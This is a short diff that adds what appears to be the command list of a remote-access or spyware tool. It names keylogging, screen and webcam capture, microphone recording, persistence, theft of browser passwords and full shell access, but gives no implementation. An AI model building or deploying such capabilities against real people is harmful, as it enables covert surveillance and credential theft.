@@ -1,0 +1,6 @@
+keylog_start/stop    # Encrypted keylogger
+screenshot           # Webcam/Screen capture
+mic_record 10        # Record 10s audio
+persist              # Install persistence
+creds                # Browser passwords
+shell cmd            # Full shell access
